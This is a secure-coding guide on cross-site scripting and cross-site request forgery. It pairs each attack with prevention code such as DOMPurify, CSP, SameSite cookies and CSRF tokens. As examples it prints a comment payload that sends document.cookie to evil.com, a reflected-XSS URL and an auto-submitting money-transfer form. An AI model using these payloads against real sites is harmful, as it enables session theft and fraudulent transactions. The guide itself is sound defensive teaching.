### Injecting Malicious Scripts into Your Pages

XSS occurs when an attacker injects JavaScript into a page that other users view. Their script runs in the victim's browser with full access to cookies, localStorage, and the DOM.

#### Types of XSS

**Stored XSS**: Malicious script is saved in the database and served to all users.

```html
<!-- Attacker submits this as a comment: -->
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>

<!-- Your app renders it as: -->
<p><script>fetch('https://evil.com/steal?c=' + document.cookie)</script></p>
<!-- Every visitor's session cookie is now stolen. -->
```

**Reflected XSS**: Script injected via URL parameter.

```
https://yoursite.com/search?q=<script>alert(document.cookie)</script>
```

#### Prevention

```js
// 1. NEVER use innerHTML with user data
// BAD:
div.innerHTML = userInput;

// GOOD: textContent escapes HTML
div.textContent = userInput;

// 2. Sanitize when HTML rendering is required
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(userMarkdown);
div.innerHTML = safe;

// 3. Content Security Policy header (blocks inline scripts)
// Content-Security-Policy: default-src 'self'; script-src 'self'

// 4. React is safe by default (escapes all JSX expressions)
<p>{userInput}</p> // Safe — React escapes this
<p dangerouslySetInnerHTML={{ __html: userInput }} /> // DANGEROUS
```

---

### Tricking Users into Making Requests They Didn't Intend

If your app uses cookies for auth, an attacker can create a page that makes requests to your API using the victim's cookies.

```html
<!-- Evil page: attacker tricks user into visiting this -->
<form action="https://yourbank.com/transfer" method="POST">
  <input name="to" value="attacker-account" />
  <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
<!-- User's browser sends the request WITH their session cookie! -->
```

#### Prevention

**SameSite cookie attribute** (best modern defense):

```js
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // Cookie not sent on cross-site requests
});

// 'lax' (default): cookie sent on top-level navigation but not forms
// 'strict': cookie never sent on cross-site requests
// 'none': always sent (requires Secure)
```

**CSRF tokens** (for older apps or where SameSite isn't enough):

```js
import csrf from 'csurf';

app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
  // Embed token in every form
  res.render('form', { csrfToken: req.csrfToken() });
});

// Frontend: include token in POST request header
await fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken },
  body: JSON.stringify({ amount: 100 }),
});
```

